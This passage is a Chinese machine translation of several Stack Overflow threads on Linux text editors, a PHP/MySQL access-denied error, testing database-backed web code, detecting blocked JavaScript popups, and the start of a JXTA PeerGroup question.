> 时间：2008-08-12T13:24:38.677

我喜欢 jEdit ( [http://www.jedit.org](http://www.jedit.org) ) 的多功能性，它有很多插件、跨平台，还有我一直使用的块选择之类的东西。

缺点是，因为它是用java编写的，所以不是最快的。

* * *

## 回答 #8

> 赞同：8
> 
> 时间：2008-08-19T14:53:27.390

我觉得 Geany ( [http://geany.uvena.de/](http://geany.uvena.de/) ) 相当不错。

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2008-08-06T00:26:27.370

我在 Linux/Solaris/etc 中使用 pico 或 nano 作为我的“休闲”文本编辑器。它很容易掌握，虽然您在菜单中丢失了几行文本，但至少很容易看到如何退出等。

我认为你甚至可以扩展 nano，并添加语法高亮。

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2008-10-17T02:54:10.140

替代文本编辑器？试试[Diakonos](http://purepistos.net/diakonos "迪亚科诺斯")，“一个面向大众的 Linux 编辑器”。剪切、复制、粘贴、撤消、打开、保存等的默认键盘映射是预期的。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2008-08-11T15:13:12.717

当我搜索 Linux 的 TextMate 替代品时，我最终使用了[Geany](http://geany.uvena.de/)。它没有那么强大，但仍然很好用。凯特的绝佳替代品。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2008-08-06T10:11:19.327

在 Mac OS X 上，我从 1990 年代初就开始使用 BBEdit，因此我将其用作所有其他编辑器的参考。我有时会使用 BBEdit 在使用 ftp 模式的 Linux 机器上编辑文件，如果你有快速的网络连接到 Linux 机器，那效果很好。

两年前我学习了 emacs，因为我加入的编程团队的其他成员都在使用它。我发现 emacs 功能强大但在很多方面都过时了，但一旦你学会了 emacs，你就可以在任何平台（Linux、OS X、Windows）上使用它。这是我现在几乎只在工作中使用的编辑器。不过，我需要数年时间才能掌握它的所有功能。

我还在 Linux 上使用过 gedit，发现它非常有用，但我没有尝试将它用作任何项目的主要编辑器。

我有一位同事在使用 Komodo Edit 4.4（从 activestate.com 免费），在 Windows 计算机上运行它，但在 ftp 模式下使用它，这样她就可以在我们的 Linux 服务器上编辑文件。Komodo Edit 有许多不错的功能，但第一次启动需要很长时间。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2009-05-03T11:54:44.963

不要忘记[NEdit](http://www.nedit.org/)！小巧轻便，但具有语法突出显示和宏记录/重放。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2009-05-06T11:48:26.747

除了 Vi 之外最好的一个？维姆。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2008-08-05T21:46:29.220

SciTE [http://www.scintilla.org/SciTE.html](http://www.scintilla.org/SciTE.html)

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2008-08-06T09:08:45.553

不幸的是，我发现的最好的是 gedit。花几个小时使用它，您会发现它还不错，有插件和主题。您可以使用命令行在其中打开文档。

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2008-08-06T09:17:08.423

+1 for pico/nano -- 轻量级，完成工作，很好的帮助

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2008-10-28T00:58:52.967

我的朋友对 jed 发誓，[http://www.jedsoft.org/jed/](http://www.jedsoft.org/jed/)

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2010-01-14T17:16:09.353

首先我不想发动战争..

我没有用过 TextMate，但我用过它的 Windows 版 e-TextEditor，我能理解为什么人们喜欢它。

为了在 Linux 上找到完美的文本编辑器，我还尝试了许多文本编辑器和 IDE。我尝试过 jEdit、vim、emacs（虽然我在大学时曾经很喜欢）和其他各种工具。

在 Linux 上，我选择了 gEdit。虽然我不时使用 Komodo Edit。当我赶时间时，我使用 gEdit 纯粹是因为它比 Komodo Edit 快。gEdit 有很多插件，并带有一些漂亮的配色方案。我认为一旦 gEdit 具有适当的代码整洁工具，它会很酷。我认为我使用 Komodo Edit 的唯一原因是项目文件工具。

我有一个朋友捐赠了他的“Vi 改进”一书，希望他可以将我转换为 Vim。这本书有一英寸厚，完全让我无法投入时间学习 Vim。

每次我找到一个编辑器——我总是发现自己又回到了 gEdit。它是一个恰到好处的编辑器。试试 gEdit，它是 Ubuntu 和 Linux Mint 中的默认文本编辑器。

这是一个关于如何让 gEdit 看起来和行为（有点）像 TextMate 的优秀指南的链接：http: [//grigio.org/pimp_my_gedit_was_textmate_linux](http://grigio.org/pimp_my_gedit_was_textmate_linux)

希望有帮助。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2008-08-11T22:40:00.897

我同意 Mike 的观点，尽管我是 Vim 的死忠。我最近在编写轻量级 Ruby 脚本时经常使用 GEdit。标准编辑器（加上 Ruby 代码片段）非常实用和完善，可以很好地缓解全功能、始终在线的编程编辑器。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2008-08-27T14:16:51.127

我刚开始使用 OSX。我发现的免费注释编辑器：

*   [ActiveState 的科莫多](http://www.activestate.com/Products/komodo_ide/index.mhtml)。免费版本中没有调试器或正则表达式编辑器（尽管 Python 自带一个，即 redemo.py），但完全可用。
*   [ERIC](http://www.die-offenbachs.de/eric/index.html)，用 PyQT 编写。
*   [带有PyDev](http://pydev.sourceforge.net/)的Eclipse是我在所有平台上编辑 Python 的首选选项。漂亮干净的 GUI，不错的调试器。良好的语法解析等。

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2008-09-08T02:54:28.657

我使用 Emacs 已经 20 年了。这很棒，而且在任何地方都可以使用。我也有 TextMate，我用它在 Mac 上做一些事情（HTML 模式很棒）。如果你想做 Ruby 开发，Netbeans 支持 Ruby，它也可以在所有平台上运行。

[http://www.netbeans.org/features/ruby/index.html](http://www.netbeans.org/features/ruby/index.html)

我看过一些博客等声称它是最好的 Ruby 环境。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2008-10-27T23:24:49.630

当我离开 Eclipse 时，我使用 joe 进行简单（而不是那么简单）的编辑。

它使用经典的 Wordstar 键绑定——虽然我从未使用过 Wordstar，但它对很多人来说是一个卖点。

它简单、支持良好、轻量级，并且它具有可用于所有内容的二进制文件。

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2009-05-06T12:08:02.583

我喜欢 Kate，因为它有几个有趣的特性（*已经引用*过），通常在（*较重*的）IDE 中可以找到。然而，我最喜欢的功能是它的终端窗口，它对于快速执行保存-编译-执行组合非常实用。

Nedit 是另一个有效的选项，包含许多功能（*并且它没有很多依赖项：恕我直言，这是一个巨大的优势*）。

对于在 shell 中进行编辑，当我不能使用 VIM 时，我会立即寻找 pico 或 nano（*但我不建议将它们用于持续开发：对于快速编辑它们是完美的*）。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2010-01-14T17:34:26.820

如果只有你？用你今天想用的；如果需要，可以在中途切换。

是团队吗？尝试成为编辑不可知论者。为空白设置标准（是否允许制表符？制表符代表多少个空格？），但除此之外允许任何人使用他们想要的任何编辑器。

它是一个做结对编程的团队吗？这就是您可能需要团队标准编辑器的地方，以便程序员可以轻松地通过键盘。

为了帮助在一个或多个程序员使用 Emacs 的商店中实施标准的空白政策：您可以在每个文件源文件的底部添加一些注释来告诉 Emacs 您的空白政策。例如，

```
# Local Variables:
# tab-width: 2
# ruby-indent-level: 2
# indent-tabs-mode: nil
# End: 
```

在该文件上使用 emacs（或 xemacs）的任何人都将自动获得组标准缩进。

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2013-06-13T13:04:18.237

Sublime Text 2 是我的最爱。直观易懂且功能强大。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2008-08-06T23:00:36.497

您可以尝试使用 ruby​​-mode、[Rinari](http://rinari.rubyforge.org/)（用于 Rails）和[yasnippet](http://code.google.com/p/yasnippet/)的 Emacs ，它提供像 Textmate 这样的自动片段。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2008-08-11T16:53:06.417

我喜欢 OSX 上的 TextMate。

有一种用于 Windows 的 TextMate 克隆，简称为“E”（[e-texteditor.com](http://www.e-texteditor.com)）。它的作者承诺很快就会有 Linux 版本。即使您已经选择了您最喜欢的，TextMate（或 E）也值得一看，仅仅是因为它与众不同。

我想说主要有四个不同的文本编辑器系列：

*   经典的基于菜单栏的编辑器，例如 WinEdit、Gedit 或 BBEdit
*   Emacs 及其兄弟 XEmacs、Aquamacs 等。
*   VI / Vim / Cream等
*   TextMate 和 E

您可以通过它们不同的使用范例来区分这些系列：

*   经典编辑器主要依赖于菜单栏和一些`Ctrl`-key 快捷键。
*   Emacs 风格的编辑使用高度复杂的键盘命令（如 Cxs）甚至整个单词来调用命令。
*   VI是基于模式的，由单键命令或整个单词操作。
*   TextMate 基于片段和经典快捷方式。

Emacs 和 TextMate 也可以通过用户在 Lisp (Emacs) 或任何其他命令行语言 (TextMate) 中创建的脚本轻松扩展。（经典编辑器和 VI 也是可扩展的，但工作量通常要大得多）

我建议每个人至少尝试每个家庭的一个好例子（如果可能的话），并找出最适合他们的。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2008-08-13T22:12:06.443

TextMate 是一个很棒的编辑器，并且有一种方法可以复制 GEdit 中的一些功能。在此处查看文章：[http:](http://rubymm.blogspot.com/2007/08/make-gedit-behave-roughly-like-textmate.html) //rubymm.blogspot.com/2007/08/make-gedit-behave-roughly-like-textmate.html 以修改 GEdit 使其表现得像 TextMate。

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2008-08-19T21:22:12.517

Vim 是对 Vi 的一个很好的升级，提供了不错的功能和一组更有用的键绑定和默认行为。然而，在我看来，像 GVim、KVim 甚至 Cream 这样的图形版本非常缺乏。我最近一直在使用[Geany](http://geany.uvena.de/)，但它也有它的缺点。

我只是在 Linux 上的 Programmers Notepad、Smultron 或 TextMate 联盟中找不到任何东西。很遗憾，因为我想生活在一个全开源的网络世界中，所以我被困在从一个几乎正确的编辑器跳到另一个编辑器中。

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2008-11-10T05:08:16.543

你可以试试蓝鱼。为网站工作提供了许多不错的功能。大多数语言的语法文件。

[http://bluefish.openoffice.nl/](http://bluefish.openoffice.nl/)

如果在 windows 上试试 Crimson Editor [http://www.crimsoneditor.com/](http://www.crimsoneditor.com/)我已经很久没有运行 windows 了，但是 iirc，“官方”开发已经停止，但社区已经接受了它的一个分支并称它为翡翠之类的。Crimson 编辑器仍然非常有能力。

bluefish和crimson editor都具有项目管理能力。FTP能力，宏等

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2009-05-03T11:37:34.413

我个人使用 MacVim，它基本上是 Mac OSx 的 GVim。但是我一直在阅读有关 Redcar 的大量信息，它是 Linux 的文本编辑器，它共享很多 Textmate 功能。检查下方的链接。

[Redcar](http://redcareditor.com)
[LURG 关于 Redcar 的讲座](http://skillsmatter.com/podcast/flex-flash/lrug-march)

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2012-04-13T13:13:15.440

我只是想我会推荐 Ninja IDE、开源和所有。我现在将它用于我所有的 Python 开发，当我有一个 GUI 可以使用并且在我的 Windows 和 Linux 机器上看起来相同时。

[忍者IDE](http://ninja-ide.org/)

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2013-06-27T22:52:29.617

对于多标签文本编辑器“medit”是最好的。它就像 windows 中的记事本++。对于时尚和好看的“schite 文本编辑器”是最好的。

# php - PHP MySQL 查询中的 MySQL/Apache 错误

> ID：2900
> 
> 赞同：29
> 
> 时间：2008-08-05T21:45:11.033
> 
> 标签：php, mysql, apache

我收到以下错误：

> 用户 'apache'@'localhost' 的访问被拒绝（使用密码：否）

使用以下代码时：

```
<?php

include("../includes/connect.php");

$query = "SELECT * from story";

$result = mysql_query($query) or die(mysql_error());

echo "<h1>Delete Story</h1>";

if (mysql_num_rows($result) > 0) {
    while($row = mysql_fetch_row($result)){
          echo '<b>'.$row[1].'</b><span align="right"><a href="../process/delete_story.php?id='.$row[0].'">Delete</a></span>';
      echo '<br /><i>'.$row[2].'</i>';
    }
}
else {
   echo "No stories available.";
}
?> 
```

该`connect.php`文件包含我的 MySQL 连接调用，这些调用与我`INSERT`在软件的另一部分中的查询正常工作。如果我注释掉这一`$result = mysql_query`行，那么它就会进入 else 语句。所以，它是那行或 if 中的内容。

我一直在网上搜索任何解决方案，大多数似乎与 MySQL 连接过多或我登录 MySQL 的用户没有权限有关。我都检查过了。我仍然可以在软件的其他地方执行我的其他查询，并且我已验证该帐户具有正确的权限。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-08-06T00:05:34.790

> 如果这很重要，apache@localhost 不是我用来进入数据库的用户帐户的名称。为此，我根本没有任何名称为 apache 的用户帐户。

如果它说“apache@localhost”，则用户名没有正确传递给 MySQL 连接。'apache' 通常是运行 httpd 进程的用户（至少在基于 Redhat 的系统上），如果在连接期间没有传递用户名，MySQL 将使用调用连接的任何人。

如果您在脚本中而不是在调用的文件中进行连接，您会得到相同的错误吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-21T18:30:18.767

将 include() 更改为 require()。**如果“connect.php”文件不能被 require()d，脚本将失败**并出现致命错误，而**include() 只会生成警告**。如果您传递给 mysql_connect() 的用户名不是“apache”，则连接脚本的错误路径是获得此类错误的最常见方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-21T17:53:03.850

不要忘记检查您的数据库错误日志。你应该能够看到你是否甚至击中了数据库。如果不是，则应检查框上的防火墙规则。在 linux 机器上，您可以运行 iptables -L 来获取防火墙列表规则。

否则，这将是一个纯粹的访问问题。执行“select * from mysql.user”以查看是否在其中设置了 apache 用户。此外，我建议专门为您的应用程序创建一个帐户，而不是使用 apache，因为您创建的任何其他应用程序默认情况下都将作为 apache 运行，并且可能会未经授权访问您的数据库。

只需在文档@dev.mysql.com 中查找“GRANT”即可获取更多信息。如果您对 db 有更具体的问题，只需编辑您的问题，我会看看。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-21T17:57:06.150

connect.php 脚本是否真的建立了连接，或者它只是定义了一个您需要调用来创建连接的函数？您遇到的错误是完全没有先前建立的连接的症状。

ETA：还将包含更改为要求。我怀疑它实际上根本不包括该文件。但是包含可能会默默地失败。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-02T19:47:10.743

伙计，答案是一个大的DUH！不幸的是，我也花了一段时间才弄清楚。您可能有一个类似 dbconnect() 的函数，并且您正在使用包含文件中的变量来建立连接。$conn = mysql_connect($dbhost, $dbuser, $dbpass)。

好吧，因为这是在函数内部，所以需要将包含文件中的变量传递给函数，否则函数将不知道 $dbhost、$dbuser 和 $dbpass 是什么。解决此问题的一种方法是使这些变量成为全局变量，以便您的函数可以获取它们。另一个不太安全的解决方案是写出您的主机、用户并传入 mysql_connect 函数。

希望这会有所帮助，但我遇到了同样的问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-08-05T21:52:44.123

只是为了检查，如果你**只**使用这部分你会得到一个错误？

```
<?php
include("../includes/connect.php");

$query = "SELECT * from story";
$result = mysql_query($query) or die(mysql_error()); 
```

如果是这样，如果您将其中一个插入内容复制并粘贴到此页面中，您是否仍然会收到错误消息，我正在尝试查看它是否在页面或实际行中。

此外，您能否发布连接调用的副本（减去密码），除非插入使用与本示例完全相同的语法。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-08-05T21:56:20.607

apache 用户是否需要密码才能连接到数据库？如果是这样，那么它说“使用密码：否”这一事实会让我相信代码试图在没有密码的情况下进行连接。

但是，如果 apache 用户不需要密码，则仔细检查权限可能是个好主意（您提到您已经检查过）。尝试在 mysql 提示符下执行类似的操作可能仍然有益：

```
GRANT ALL PRIVILEGES ON `*databasename*`.* to 'apache'@'localhost'; 
```

该语法应该是正确的。

除此之外，我和你一样难过。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-05T22:02:23.777

如果您确实能够使用相同的连接调用进行插入，那么您的问题很可能在于用户“apache”没有对数据库的 SELECT 权限。如果您安装了 phpMyAdmin，您可以在“权限”窗格中查看用户的权限。phpMyAdmin 还可以很容易地修改权限。

如果您只能访问命令行，则可以检查 mysql 数据库的权限。

您可能需要执行以下操作：

```
GRANT SELECT ON myDatabase.myTable TO 'apache'@'localhost'; 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-08-05T22:40:40.720

> 只是为了检查，如果你只使用这部分你会得到一个错误？
> 
> 如果是这样，如果您将其中一个插入内容复制并粘贴到此>页面中，您是否仍然会收到错误消息，我正在尝试查看它是否在页面或实际行中。
> 
> 此外，您能否发布连接调用的副本（减去密码），除非插入 > 使用与本示例完全相同的语法。

这是 connection.php 文件中的内容。我通过包含链接到该文件，其方式与在代码中其他地方执行 INSERT 查询的方式相同。

```
$conn = mysql_connect("localhost", ******, ******) or die("Could not connect");
mysql_select_db("adbay_com_-_cms") or die("Could not select database"); 
```

我将尝试在该区域中使用有效的 INSERT 查询来检查它。

至于其他有关密码访问的帖子。正如我在第一篇文章中所述，我确实检查了权限。我使用 phpMyAdmin 来验证我使用的用户帐户的权限是否正确。如果这很重要，apache@localhost 不是我用来进入数据库的用户帐户的名称。为此，我根本没有任何名称为 apache 的用户帐户。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-06-21T21:06:26.357

您可以执行以下操作之一：

*   添加用户“apache”并从 phpmyadmin 或在 shell 上使用 mysql 设置其权限
*   告诉 php 以`mysql_connect`另一个用户身份运行，该用户已经拥有所需权限（但可能不是 root），在 php.ini 文件中查找 mysql.default_user。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-09-19T10:46:15.757

您是否记得这样做：

```
flush privileges; 
```

如果未设置用户，则会给出 'apache'@'localhost' 错误。

# database - 如何测试网页代码？

> ID：2913
> 
> 赞同：17
> 
> 时间：2008-08-05T21:58:51.927
> 
> 标签：database, testing

有没有人有一些很好的提示来为严重依赖状态的数据库后端开发编写测试代码？

具体来说，我想为从数据库中检索记录的代码编写测试，但答案将取决于数据库中的数据（可能会随着时间而改变）。

人们是否通常使用“冻结”数据库创建一个单独的开发系统，以便任何给定的函数都应该始终返回完全相同的结果集？

我很确定这不是一个新问题，所以我很想学习其他人的经验。

有没有很好的文章来讨论这个基于 Web 的开发问题？

我通常编写 PHP 代码，但我希望所有这些问题在很大程度上与语言和框架无关。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-08-05T22:03:29.750

您应该查看 DBUnit，或尝试找到一个 PHP 等效项（必须有一个）。您可以使用它来准备具有代表您的测试数据的特定数据集的数据库，因此每个测试将不再依赖于数据库和某些现有状态。这样，每个测试都是独立的，不会在进一步使用数据库时中断。

更新：快速谷歌搜索显示 PHPUnit 的[数据库单元扩展](http://www.ds-o.com/archives/63-PHPUnit-Database-Extension-DBUnit-Port.html)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-06T04:14:42.433

如果您最关心数据层测试，您可能需要查看这本书： **xUnit 测试模式：重构测试代码**。我自己一直对此不确定，但这本书很好地帮助列举了性能、可重复性等问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-06T13:44:48.443

我想这取决于您使用的数据库，但 Red Gate (www.red-gate.com) 制作了一个名为 SQL 数据生成器的工具。这可以配置为用看起来合理的测试数据填充您的数据库。您还可以告诉它在其随机数生成器中始终使用相同的种子，这样您的“随机”数据每次都是相同的。

然后，您可以编写单元测试来利用这些可靠、可重复的数据。

至于测试网络方面的事情，我目前正在研究 Selenium (selenium.openqa.org)。这似乎是一个支持跨浏览器的测试套件，可以帮助您测试功能。然而，与所有这些网站测试工具一样，没有真正的方法可以测试这些东西在所有浏览器中的*外观*而不用人眼观察它们！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-10T12:02:14.610

We use an in-memory database (hsql : [http://hsqldb.org/](http://hsqldb.org/)). Hibernate ([http://www.hibernate.org/](http://www.hibernate.org/)) makes it easy for us to point our unit tests at the testing db, with the added bonus that they run as quick as lightning..

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-08-05T22:03:33.260

我的工作也有同样的问题，我发现最好的办法是用一个 PHP 脚本重新创建数据库，然后用一个单独的脚本向它抛出疯狂的数据，看看它是否会破坏它。

我从未使用过任何单元测试或类似的东西，所以不能说它是否有效。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-08-05T22:08:11.050

如果您可以在运行测试之前使用已知数量设置数据库并在最后拆除，那么您将知道您正在使用哪些数据。

然后，您可以使用 Selenium 之类的东西轻松地从您的 UI 进行测试（假设这里是基于 Web 的，但是有很多用于其他 UI 风格的 UI 测试工具）并检测从数据库中提取的某些记录的存在。

绝对值得设置数据库的测试版本 - 或者让您的测试脚本使用已知数据填充数据库作为测试的一部分。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-08-06T12:06:28.597

您可以尝试[http://selenium.openqa.org/](http://selenium.openqa.org/)它更多地用于 GUI 测试而不是数据层测试应用程序，但确实记录了您的操作，然后可以回放这些操作以跨不同平台进行自动化测试。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-11T13:30:32.457

这是我的策略（我使用 JUnit，但我确信有一种方法可以在 PHP 中进行等效操作）：

我有一个在特定 DAO 类的所有单元测试之前运行的方法。它将开发数据库置于已知状态（添加所有测试数据等）。当我运行测试时，我会跟踪添加到已知状态的任何数据。每次测试结束时都会清理此数据。在该类的所有测试都运行之后，另一个方法会删除 dev 数据库中的所有测试数据，使其保持在运行测试之前的状态。完成这一切需要一些工作，但我通常在 DBTestCommon 类中编写方法，我的所有 DAO 测试类都可以访问它们。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-08-19T18:40:33.063

我建议使用三个数据库。一个生产数据库，一个开发数据库（为每个开发人员填充了一些有意义的数据）和一个测试数据库（带有空表和可能总是需要的几行）。

测试数据库代码的一种方法是：

1.  插入几行（使用 SQL）来初始化状态
2.  运行要测试的函数
3.  将预期结果与实际结果进行比较。在这里您可以使用正常的单元测试框架
4.  清理已更改的行（因此下一次运行不会看到上一次运行）

可以使用标准方式（当然，仅在测试数据库中）使用`DELETE * FROM table`.

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-09-10T11:31:15.260

一般来说，我同意 Peter 的观点，但对于创建和删除测试数据，我不会直接使用 SQL。我更喜欢使用产品中使用的一些 CRUD API 来创建尽可能类似于生产的数据......

# javascript - 如何检测浏览器是否阻止弹出窗口？

> ID：2914
> 
> 赞同：145
> 
> 时间：2008-08-05T22:01:36.977
> 
> 标签：javascript, html, popup

有时，我遇到一个网页试图弹出一个新窗口（用于用户输入或其他重要内容），但弹出窗口阻止程序阻止了这种情况的发生。

调用窗口可以使用哪些方法来确保新窗口正确启动？

* * *

## 回答 #1

> 赞同：182
> 
> 时间：2008-08-05T22:03:27.953

如果您使用 JavaScript 打开弹出窗口，您可以使用如下内容：

```
var newWin = window.open(url);             

if(!newWin || newWin.closed || typeof newWin.closed=='undefined') 
{ 
    //POPUP BLOCKED
} 
```

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2014-12-31T19:16:29.847

我尝试了上面的一些示例，但无法让它们与 Chrome 一起使用。这种简单的方法似乎适用于 Chrome 39、Firefox 34、Safari 5.1.7 和 IE 11。这是我们 JS 库中的代码片段。

```
openPopUp: function(urlToOpen) {
    var popup_window=window.open(urlToOpen,"myWindow","toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=yes, copyhistory=yes, width=400, height=400");            
    try {
        popup_window.focus();   
    } catch (e) {
        alert("Pop-up Blocker is enabled! Please add this site to your exception list.");
    }
} 
```

* * *

## 回答 #3

> 赞同：35
> 
> 时间：2012-11-30T20:39:57.453

更新：弹出窗口存在于非常古老的时代。最初的想法是在不关闭主窗口的情况下显示另一个内容。到目前为止，还有其他方法可以做到这一点：JavaScript 能够向服务器发送请求，因此很少使用弹出窗口。但有时它们仍然很方便。

在过去，邪恶的网站滥用弹出窗口很多。一个糟糕的页面可能会打开大量带有广告的弹出窗口。所以现在大多数浏览器都试图阻止弹出窗口并保护用户。

如果在用户触发的事件处理程序（如 onclick）之外调用弹出窗口，大多数浏览器都会阻止它们。

如果你仔细想想，这有点棘手。如果代码直接在 onclick 处理程序中，那么这很容易。但是 setTimeout 中打开的弹出窗口是什么？

试试这个代码：

```
 // open after 3 seconds
setTimeout(() => window.open('http://google.com'), 3000); 
```

弹出窗口在 Chrome 中打开，但在 Firefox 中被阻止。

…这也适用于 Firefox：

```
 // open after 1 seconds
setTimeout(() => window.open('http://google.com'), 1000); 
```

不同之处在于 Firefox 认为 2000 毫秒或更短的超时是可以接受的，但在它之后 – 删除“信任”，假设现在它是“用户操作之外的”。所以第一个被阻止，第二个没有。

* * *

2012 年的原始答案：

> 此弹出窗口拦截器检查解决方案已在 FF (v11)、Safari (v6)、Chrome (v23.0.127.95) 和 IE (v7 & v9) 中进行了测试。更新 displayError 函数以处理您认为合适的错误消息。
> 
> ```
> var popupBlockerChecker = {
>     check: function(popup_window){
>         var scope = this;
>         if (popup_window) {
>             if(/chrome/.test(navigator.userAgent.toLowerCase())){
>                 setTimeout(function () {
>                     scope.is_popup_blocked(scope, popup_window);
>                 },200);
>             }else{
>                 popup_window.onload = function () {
>                     scope.is_popup_blocked(scope, popup_window);
>                 };
>             }
>         } else {
>             scope.displayError();
>         }
>     },
>     is_popup_blocked: function(scope, popup_window){
>         if ((popup_window.innerHeight > 0)==false){ 
>             scope.displayError();
>         }
>     },
>     displayError: function(){
>        alert("Popup Blocker is enabled! Please add this site to your exception list.");
>     }
> }; 
> ```
> 
> 用法：
> 
> ```
> var popup = window.open("http://www.google.ca", '_blank');
> popupBlockerChecker.check(popup); 
> ```

希望这可以帮助！:)

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2016-02-26T22:49:35.260

*无论浏览器公司或版本如何，一个始终*有效的“解决方案”是简单地在屏幕上放置一条警告消息，靠近将创建一个弹出窗口的控件，礼貌地警告用户该操作需要弹出 -并请为该站点启用它们。

我知道这并不花哨或任何东西，但它不能变得更简单，只需要大约 5 分钟的测试，然后你就可以继续做其他噩梦了。

一旦用户允许您的网站弹出窗口，如果您不过度使用弹出窗口也是体贴的。您要做的最后一件事就是惹恼您的访客。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-02-27T05:53:13.450

我结合了@Kevin B 和@DanielB 的解决方案。
这要简单得多。

```
var isPopupBlockerActivated = function(popupWindow) {
    if (popupWindow) {
        if (/chrome/.test(navigator.userAgent.toLowerCase())) {
            try {
                popupWindow.focus();
            } catch (e) {
                return true;
            }
        } else {
            popupWindow.onload = function() {
                return (popupWindow.innerHeight > 0) === false;
            };
        }
    } else {
        return true;
    }
    return false;
}; 
```

用法：

```
var popup = window.open('https://www.google.com', '_blank');
if (isPopupBlockerActivated(popup)) {
    // Do what you want.
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-01-30T12:29:01.120

我尝试了很多解决方案，但我能想到的唯一一个也适用于 uBlock Origin 的解决方案是利用超时来检查弹出窗口的关闭状态。

```
function popup (url, width, height) {
    const left = (window.screen.width / 2) - (width / 2)
    const top = (window.screen.height / 2) - (height / 2)
    let opener = window.open(url, '', `menubar=no, toolbar=no, status=no, resizable=yes, scrollbars=yes, width=${width},height=${height},top=${top},left=${left}`)

    window.setTimeout(() => {
        if (!opener || opener.closed || typeof opener.closed === 'undefined') {
            console.log('Not allowed...') // Do something here.
        }
    }, 1000)
} 
```

显然这是一个 hack；就像这个问题的所有解决方案一样。

您需要在 setTimeout 中提供足够的时间来说明初始打开和关闭，因此它永远不会完全准确。这将是一个反复试验的位置。

将此添加到您的尝试列表中。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-31T06:52:17.363

**如果您也拥有子代码**，一种简单的方法是在其 html 中创建一个简单的变量，如下所示：

```
 <script>
        var magicNumber = 49;
    </script> 
```

然后从父项检查它的存在，类似于以下内容：

```
 // Create the window with login URL.
    let openedWindow = window.open(URL_HERE);

    // Check this magic number after some time, if it exists then your window exists
    setTimeout(() => {
        if (openedWindow["magicNumber"] !== 32) {
            console.error("Window open was blocked");
        }
    }, 1500); 
```

我们等待一段时间以确保该网页已加载，并检查其是否存在。显然，如果窗口在 1500 毫秒后没有加载，那么变量仍然是`undefined`.

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2018-05-29T14:56:56.983

通过使用 onbeforeunload 事件，我们可以检查如下

```
 function popup()
    {
        var chk=false;
        var win1=window.open();
        win1.onbeforeunload=()=>{
            var win2=window.open();
            win2.onbeforeunload=()=>{
                chk=true;
            };
        win2.close();
        };
        win1.close();
        return chk;
    } 
```

它将在后台打开 2 个黑色窗口

该函数返回布尔值。

# java - 开始使用自定义 JXTA PeerGroup

> ID：2931
> 
> 赞同：25
> 
> 时间：2008-08-05T22:23:16.183
> 
> 标签：java, p2p, jxta

在过去一年左右的时间里，我一直在使用*JXTA* 2.3 来开发我正在开发的点对点计算平台。我正在迁移到*JXTA* 2.5 并且在此过程中我试图清理我对*JXTA*的大量使用。在大多数情况下，我与*JXTA*接触时**只是抱着让它工作**的态度。我用它来快速创建和管理我的点对点覆盖网络并提供基本的通信服务。我想以更*JXTA*的方式使用它，因为无论如何我都在进行更改以迁移到 2.5。

我的第一步将是一个自定义的基本创建`PeerGroup`。`META-INF.services`我看到了一些使用Java 基础架构的新机制。我应该`PeerGroup`在此处列出一个带有*GUID*的相关实现对象`net.jxta.platform.Module`吗？据我了解，如果我这样做，当遇到并加入或创建具有与*GUID匹配的规范 ID 的组时，它应该自动使用匹配的对象。*我应该能够手动将一个`PeerGroup`对象绑定到组，但是这种使用的新方法`META-INF`似乎更容易管理。

有没有人有任何使用此基础架构进行`PeerGroup`实施的指示或示例？此外，有关 Java 机制的一些一般信息`META-INF.services`也会有所帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-08-11T22:38:05.567

